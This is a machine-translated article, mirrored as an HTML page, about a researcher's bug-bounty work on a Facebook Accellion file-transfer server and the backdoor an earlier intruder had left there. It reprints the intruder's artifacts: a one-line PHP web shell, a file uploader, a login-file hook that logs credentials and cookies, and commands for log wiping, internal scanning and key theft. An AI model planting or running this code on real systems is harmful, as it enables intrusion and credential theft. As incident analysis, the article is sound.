<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How I hacked Facebook and found someone else's backdoor</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Orange Tsai security researcher hacked one of Facebook's servers and discovered a backdoor to collect company employee accounts left by the attacker. ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How I hacked Facebook and found someone else's backdoor</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/b05/a61/300/b05a613002904926887b2778c7a333e7.png"><br><br>  Orange Tsai security researcher hacked one of Facebook's servers and discovered a backdoor to collect company employee accounts left by the attacker. <br><a name="habracut"></a><br>  As a researcher writes in his blog, he was always more attracted by server-side attacks than client-side (XSS, etc.). <br><br>  In 2012, Facebook launched the BugBounty program, which prompted the researcher to participate in the search for vulnerabilities on the servers of this popular social network. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The first stage is the exploration and collection of information, or so-called.  recon on the object of attack. <br><br>  The researcher set himself several goals: <br><br><ul><li>  What can be discovered using Google Hacking queries ?; </li><li>  How many class B and C subnets are used ?; </li><li>  Whois, reverse-ip and axfr requests; </li><li>  Used domain names, subdomains; </li><li>  Software and hardware equipment (vendors, software versions, etc.); </li><li>  Possible source leaks on Github or Pastebin services </li><li>  Etc. </li></ul><br>  The BugBounty program usually has clear boundaries and limitations, but nevertheless, the researcher decided to search on the network perimeter for vulnerable services, possibly not included in the BugBounty scop, but nevertheless directly affecting the security infrastructure of the world's most popular social network. <br><br>  Using the reverse whois technique, he discovered an interesting domain - tfbnw.net.  Under this name, he suggested that he is dealing with TheFacebook Network. <br><br>  On this domain was located the vpn.tfbnw.net subdomain, on which was the Juniper SSL VPN web interface.  Unfortunately for the researcher, this version did not contain public vulnerabilities.  However, by examining this C-class subnet, he discovered several interesting services: <br><br><ul><li>  Mail Server Outlook Web App; </li><li>  F5 BIGIP SSL VPN; </li><li>  CISCO ASA SSL VPN; </li><li>  Oracle E-Business; </li><li>  MobileIron MDM; </li></ul><br>  Also, among these IP addresses, the server files.fb.com was discovered.  Judging by the web application footer, Accellion's Secure File Transfer (also known by the acronym FTA) was used: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/636/5cc/ddc/6365ccddc665d990e4c0e30d83595bb5.jpg"><br><br>  FTA is a product that provides secure file transfer, file sharing and synchronization, as well as integration with login mechanisms, including AD, LDAP, and Kerberos.  Enterprise version supports SSL VPN services. <br><br>  The researcher tried to find a current public exploit for this vulnerability and found a mention of the vulnerable version 0.18 ( <a href="https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857">Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857</a> ). <br><br>  The version can be determined by the query ‚Äú/ tws / getStatus‚Äù.  The latest version was installed on the site - 0.20, which does not contain the vulnerabilities described above. <br><br>  If it was not possible to find vulnerabilities using the black box method, you can try to find them with white.  The researcher downloaded the FTA source codes and began searching for vulnerabilities in this product. <br><br>  Researching the application, several conclusions were made: <br><br><ul><li>  The web interface is a combination of Perl and PHP; </li><li>  PHP was obfuscated using IonCube; </li><li>  Many Perl demons have been used. </li></ul><br>  The researcher first tried to unprotect IonCube, but using public tools he failed.  Also, he suggested that Rapid7 discovered surface vulnerabilities and it was necessary to dig much deeper. <br><br>  The result of FTA research was finding: <br><br><ul><li>  3 XSS vulnerabilities; </li><li>  Pre-Auth SQL injection resulting in Remote Code Execution; </li><li>  Predictive secret-key, leading to remote code execution (Remote Code Execution); </li><li>  2 vulnerabilities leading to local privilege escalation (Local Privilege Escalation). </li></ul><br>  In addition to sending a message about vulnerabilities to the Facebook Security Team, the corresponding notifications and the vendor of the vulnerable software, Accellion, were sent.  The following CVEs have been assigned to vulnerabilities: <br><br><ul><li>  CVE-2016-2350 </li><li>  CVE-2016-2351 </li><li>  CVE-2016-2352 </li><li>  CVE-2016-2353 </li></ul><br>  (More details will be revealed after the application of the disclosure / non-disclosure policy). <br><br>  T.N.  Shell flooding with sql-injection: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/5c9/0be/cd6/5c90becd666f28fdc0220935115020b6.jpg"><br><br>  After gaining access to the server, the researcher took predictable steps to explore the server environment to minimize detection.  They were found: <br><br><ul><li>  Blocking outgoing TCP and UDP connections on ports 53, 80 and 443; </li><li>  Remote Syslog server; </li><li>  Enabled auditd log. </li></ul><br>  Despite the prohibitive firewall rules for outgoing connections, the researcher was able to establish a connection using an ICMP tunnel. <br><br>  After the researcher managed to establish acceptable control over the web server, he found some strange error messages in the / var / opt / apache / php_error_log logs: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fe9/f21/a0a/fe9f21a0ac1af1082efa41c6bbc0523e.jpg"><br><br>  Examining the error messages and navigating to the affected directories, he found the web shell left by the previous ‚Äúvisitor‚Äù. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/56c/71c/daa/56c71cdaacd9197ce0b7c37dbe1706c7.jpg"><br><br>  Contents of some "interesting" files: <br>  <b>sshpass</b> <br><pre><code class="php hljs">Right, THAT sshpass</code> </pre> <br>  <b>bN3d10Aw.php</b> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> shell_exec($_GET[<span class="hljs-string"><span class="hljs-string">'c'</span></span>]); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre><br>  <b>uploader.php</b> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> move_uploaded_file($_FILES[<span class="hljs-string"><span class="hljs-string">"f]["</span></span>tmp_name<span class="hljs-string"><span class="hljs-string">"], basename($_FILES["</span></span>f<span class="hljs-string"><span class="hljs-string">"]["</span></span>name<span class="hljs-string"><span class="hljs-string">"])); ?&gt;</span></span></code> </pre><br>  <b>d.php</b> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> include_oncce(<span class="hljs-string"><span class="hljs-string">"/home/seos/courier/remote.inc"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> decrypt($_GET[<span class="hljs-string"><span class="hljs-string">"c"</span></span>]); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre><br>  <b>sclient_user_class_standard.inc</b> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">include_once</span></span>(<span class="hljs-string"><span class="hljs-string">'sclient_user_class_standard.inc.orig'</span></span>); $fp = fopen(<span class="hljs-string"><span class="hljs-string">"/home/seos/courier/B3dKe9sQaa0L.log"</span></span>, <span class="hljs-string"><span class="hljs-string">"a"</span></span>); $retries = <span class="hljs-number"><span class="hljs-number">0</span></span>; $max_retries = <span class="hljs-number"><span class="hljs-number">100</span></span>; <span class="hljs-comment"><span class="hljs-comment">// blah blah blah... fwrite($fp, date("Ymd H:i:s T") . ";" . $_SERVER["REMOTE_ADDR"] . ";" . $_SERVER["HTTP_USER_AGENT"] . ";POST=" . http_build_query($_POST) . ";GET=" . http_build_query($_GET) . ";COOKIE=" . http_build_query($_COOKIE) . "\n"); // blah blah blah...</span></span></code> </pre><br>  The last file include_once contains a call to the ‚Äúregular‚Äù file sclient_user_class_standard.inc.orig to verify the password.  The attacker used the modified file as a kind of proxy to collect GET and POST requests, COOKIES values ‚Äã‚Äãin plain-text. <br><br>  An unknown attacker created a log file, which could be easily obtained from a hacked web server: <br><pre> <code class="bash hljs">wget https://files.fb.com/courier/B3dKe9sQaa0L.log</code> </pre><br><br>  An example of an intercepted account: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/c6d/5ce/a1c/c6d5cea1c3b71042fcc27fc49f0d9de8.jpg"><br><br>  From February 1 to February 7, about 300 user accounts of "@ fb.com" and "@ facebook.com" were intercepted: <br><br><ul><li>  Regular users - accounts are stored in the database and encrypted with the "salty" SHA256. </li><li>  Facebook employees (@ fb.com) are authenticated using LDAP. </li></ul><br>  The data obtained by the attacker could lead to a compromise of related services (VPN, OWA, etc.). <br><br>  The researcher notes that the attacker's actions were rather negligent, which indicates his unprofessionalism. <br><br>  Every few days, the attacker cleaned the logs: <br><br><pre> <code class="bash hljs">192.168.54.13 - - 17955 [Sat, 23 Jan 2016 19:04:10 +0000 | 1453575850] <span class="hljs-string"><span class="hljs-string">"GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p '12069238df' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &gt; /home/seos/courier/B3dKe9sQaa0L.log' 2&gt;/dev/stdout HTTP/1.1"</span></span> 200 2559 ...</code> </pre><br><br>  Archived files: <br><br><pre> <code class="bash hljs">cat tmp_list3_2 | <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-built_in"><span class="hljs-built_in">read</span></span> line; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> cp /home/filex2/1000/<span class="hljs-variable"><span class="hljs-variable">$line</span></span> files; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> 2&gt;/dev/stdout tar -czvf files.tar.gz files</code> </pre><br><br>  Investigated the internal network: <br><br><pre> <code class="bash hljs">dig a archibus.thefacebook.com telnet archibus.facebook.com 80 curl http://archibus.thefacebook.com/spaceview_facebook/locator/room.php dig a records.fb.com telnet records.fb.com 80 telnet records.fb.com 443 wget -O- -q http://192.168.41.16 dig a acme.facebook.com ./sshpass -p <span class="hljs-string"><span class="hljs-string">'********'</span></span> ssh -v -o StrictHostKeyChecking=no soggycat@localhost <span class="hljs-string"><span class="hljs-string">'for i in $(seq 201 1 255); do for j in $(seq 0 1 255); do echo "192.168.$i.$j:`dig +short ptr $j.$i.168.192.in-addr.arpa`"; done; done'</span></span> 2&gt;/dev/stdout ...</code> </pre><br><br>  I used ShellScript to scan the internal network, but forgot to redirect STDERR: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/68e/bbd/8b3/68ebbd8b3ed2251ad187f846658dda47.jpg"><br><br>  Tried to connect to the LDAP server: <br><br><pre> <code class="bash hljs">sh: -c: line 0: syntax error near unexpected token `(<span class="hljs-string"><span class="hljs-string">' sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w '</span></span>********<span class="hljs-string"><span class="hljs-string">' -s base (objectclass=*) 2&gt;/dev/stdout'</span></span></code> </pre><br><br>  Tried to get direct access to OWA: <br><br><pre> <code class="bash hljs">--20:38:09-- https://mail.thefacebook.com/ Resolving mail.thefacebook.com... 192.168.52.37 Connecting to mail.thefacebook.com|192.168.52.37|:443... connected. HTTP request sent, awaiting response... 302 Found Location: https://mail.thefacebook.com/owa/ [following] --20:38:10-- https://mail.thefacebook.com/owa/ Reusing existing connection to mail.thefacebook.com:443. HTTP request sent, awaiting response... 302 Moved Temporarily Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0 [following] --20:38:10-- https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0 Reusing existing connection to mail.thefacebook.com:443. HTTP request sent, awaiting response... 200 OK Length: 8902 (8.7K) [text/html] Saving to: `STDOUT<span class="hljs-string"><span class="hljs-string">' 0K ........ 100% 1.17G=0s 20:38:10 (1.17 GB/s) - `-'</span></span> saved [8902/8902] --20:38:33-- (try:15) https://10.8.151.47/ Connecting to 10.8.151.47:443... --20:38:51-- https://svn.thefacebook.com/ Resolving svn.thefacebook.com... failed: Name or service not known. --20:39:03-- https://sb-dev.thefacebook.com/ Resolving sb-dev.thefacebook.com... failed: Name or service not known. failed: Connection timed out. Retrying.</code> </pre><br><br>  Tried to steal the root ssl certificate: <br><br><pre> <code class="bash hljs">sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied ls: /etc/opt/apache/ssl.key/server.key: No such file or directory mv: cannot <span class="hljs-built_in"><span class="hljs-built_in">stat</span></span> `x<span class="hljs-string"><span class="hljs-string">': No such file or directory sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied mv: cannot stat `x'</span></span>: No such file or directory sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied mv: cannot <span class="hljs-built_in"><span class="hljs-built_in">stat</span></span> `x<span class="hljs-string"><span class="hljs-string">': No such file or directory sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied mv: cannot stat `x'</span></span>: No such file or directory sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied mv: cannot <span class="hljs-built_in"><span class="hljs-built_in">stat</span></span> `x<span class="hljs-string"><span class="hljs-string">': No such file or directory sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied base64: invalid input</span></span></code> </pre><br><br>  After checking the browser, you can see that files.fb.com is signed with fb.com certificate: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e2f/6ed/f92/e2f6edf92fa7afadd4f9a3d252397069.jpg"><br><br>  The researcher reported on the identified vulnerability and activity of the attacker on the server to technical specialists of the company Facebook.  Analysis of the logs showed that there were two invasions of the system - in July and September.  Whether it was the same attacker is unknown.  The July incident occurred just at the time of the appearance of the exploit to the above-mentioned CVE-2015-2857 from Rapid7 as part of the Metasploit Framework. </div><p>Source: <a href="https://habr.com/ru/post/282179/">https://habr.com/ru/post/282179/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../282163/index.html">Using arduino to automate device testing</a></li>
<li><a href="../282165/index.html">The results of the selection for the section Young School</a></li>
<li><a href="../282167/index.html">As I wrote the book 'Python Machine Learning'</a></li>
<li><a href="../282173/index.html">You Telegramma: SPARQL-injections and CSRF via Telegram-messages in the NeoQUEST-2016 task</a></li>
<li><a href="../282175/index.html">ITMO University Digest: # 1 Education and Science</a></li>
<li><a href="../282181/index.html">Features of national management</a></li>
<li><a href="../282183/index.html">3D printer calibration</a></li>
<li><a href="../282187/index.html">VoIP Part 1</a></li>
<li><a href="../282189/index.html">Graphic VGA-controller on SoC without HDL knowledge</a></li>
<li><a href="../282191/index.html">Rendering UTF-8 text using an SDF font</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>